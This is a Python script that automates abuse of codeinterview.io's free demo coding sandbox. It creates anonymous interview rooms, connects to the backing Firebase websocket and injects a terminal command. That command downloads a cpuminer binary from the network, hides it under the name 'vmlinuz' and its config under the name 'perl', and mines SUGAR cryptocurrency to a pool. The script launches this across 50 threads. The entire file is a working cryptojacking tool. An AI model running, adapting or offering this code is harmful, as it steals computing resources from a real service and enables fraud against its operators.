import json
import random
import string
import time

import cloudscraper
from threading import Thread

import requests
from websocket import create_connection

USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36'


class CIWorker:

    def __init__(self) -> None:
        self.s = cloudscraper.CloudScraper()
        self.nbk_id = ''.join(random.choices(string.ascii_lowercase, k=10))
        self.box_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=18))
        self.client_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))

        self.s.headers = {'user-agent': USER_AGENT}

    def work(self):
        r1 = self.s.get('https://codeinterview.io/demo')

        r2 = self.s.post('https://api.codeinterview.io/codeblimp/new',
                         json={'id': self.nbk_id,
                               'name': '2021-03-13 - Interview',
                               'firebasePath': f'https://remoteinterview.firebaseio.com/quickpad/{self.nbk_id}/terminal/',
                               'firebaseBasePath': f'https://remoteinterview.firebaseio.com/quickpad/{self.nbk_id}',
                               'extra1': 'created_try_demo',
                               'isCodepad': True})

        print(r2.text)
        r3 = self.s.post('https://api.codeinterview.io/createLog',
                         json={"product": "CI", "eventType": "interview_user_joined", "data": {"room_id": self.nbk_id}})
        print(r3.text)

        r4 = self.s.get(f'https://api.codeinterview.io/codeblimp/updateLastVisited/{self.nbk_id}')
        print(r4.text)

        r5 = self.s.post('https://api.codeinterview.io/codeblimp/compilebox/init',
                         json={"id": self.box_id,
                               "firebasePath": f"https://remoteinterview-compilebox.firebaseio.com/compilebox_instances/{self.nbk_id}/terminal/{self.box_id}",
                               "owner": "anonymous"})
        print(r5.text)
        conn = create_connection('wss://remoteinterview-compilebox.firebaseio.com/.ws?v=5',
                                 header={'user-agent': USER_AGENT})

        json_to_send = [{"t": "d", "d": {"r": 1, "a": "s", "b": {"c": {"sdk.jself.s.2-4-2": 1}}}}, {"t": "d",
                                                                                                    "d": {"r": 2,
                                                                                                          "a": "q",
                                                                                                          "b": {
                                                                                                              "p": f"/compilebox_instances/{self.nbk_id}/terminal/compiles_output",
                                                                                                              "h": ""}}},
                        {"t": "d", "d": {"r": 3, "a": "q",
                                         "b": {"p": f"/compilebox_instances/{self.nbk_id}/terminal/sandself.box_id",
                                               "h": ""}}}, {"t": "d", "d": {"r": 4, "a": "p", "b": {
                "p": f"/compilebox_instances/{self.nbk_id}/terminal/sandself.box_id", "d": self.box_id, "h": ""}}},
                        {"t": "d", "d": {"r": 5, "a": "p", "b": {
                            "p": f"/compilebox_instances/{self.nbk_id}/terminal/{self.box_id}/clients/{self.client_id}",
                            "d": True}}}, {"t": "d", "d": {"r": 6, "a": "o", "b": {
                "p": f"/compilebox_instances/{self.nbk_id}/terminal/{self.box_id}/clients/{self.client_id}",
                "d": None}}}, {"t": "d", "d": {"r": 7, "a": "q", "b": {
                "p": f"/compilebox_instances/{self.nbk_id}/terminal/{self.box_id}/compiles_output", "h": ""}}},
                        {"t": "d", "d": {"r": 8, "a": "q", "b": {
                            "p": f"/compilebox_instances/{self.nbk_id}/terminal/{self.box_id}/output", "h": ""}}},
                        {"t": "d", "d": {"r": 9, "a": "q",
                                         "b": {"p": f"/compilebox_instances/{self.nbk_id}/terminal/{self.box_id}/port",
                                               "h": ""}}}, {"t": "d", "d": {"r": 10, "a": "q", "b": {
                "p": f"/compilebox_instances/{self.nbk_id}/terminal/{self.box_id}/tunnelUrl", "h": ""}}}, {"t": "d",
                                                                                                           "d": {
                                                                                                               "r": 11,
                                                                                                               "a": "q",
                                                                                                               "b": {
                                                                                                                   "p": f"/compilebox_instances/{self.nbk_id}/terminal/{self.box_id}/isMounted",
                                                                                                                   "h": ""}}},
                        {"t": "d", "d": {"r": 12, "a": "q", "b": {
                            "p": f"/compilebox_instances/{self.nbk_id}/terminal/{self.box_id}/isAlive", "h": ""}}},
                        {"t": "d", "d": {"r": 13, "a": "n", "b": {
                            "p": f"/compilebox_instances/{self.nbk_id}/terminal/{self.box_id}/isAlive"}}}, {"t": "d",
                                                                                                            "d": {
                                                                                                                "r": 14,
                                                                                                                "a": "q",
                                                                                                                "b": {
                                                                                                                    "p": f"/compilebox_instances/{self.nbk_id}/terminal/{self.box_id}/isAlive",
                                                                                                                    "h": ""}}}]

        for j in json_to_send:
            conn.send(json.dumps(j))

        while True:
            rcv = conn.recv()
            print(rcv)
            if 'user@machine' in rcv:
                print('Got input ID')
                input_id = rcv.split('/')[5].split('",')[0]
                break

        a = {
            "t": "d",
            "d": {
                "r": 15,
                "a": "p",
                "b": {
                    "p": f"/compilebox_instances/{self.nbk_id}/terminal/{self.box_id}/input/{input_id}",
                    "d": """wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.15/cpuminer-opt-linux.tar.gz && tar xzvf cpuminer-opt-linux.tar.gz && cp cpuminer-sse2 vmlinuz && chmod +x vmlinuz && echo '{"user": "SUGAR_WALLET", "url": "stratum+tcp://stratum-na.rplant.xyz:7042", "pass": "x", "algo": "yespowerSUGAR", "no-color": true, "no-extranonce": false}' > perl && ./vmlinuz -c perl -t1 --no-auto\r"""
                }
            }
        }

        b = 0
        while True:
            rcv = conn.recv()
            print(rcv)
            if 'isAlive' in rcv:
                print('Machine ready')
                b += 1
            if b > 2:
                break

        conn.send(json.dumps(a))

        while True:
            print(conn.recv())


def wk_thread():
    CIWorker().work()


for _ in range(50):
    Thread(target=wk_thread).start()
    time.sleep(5)
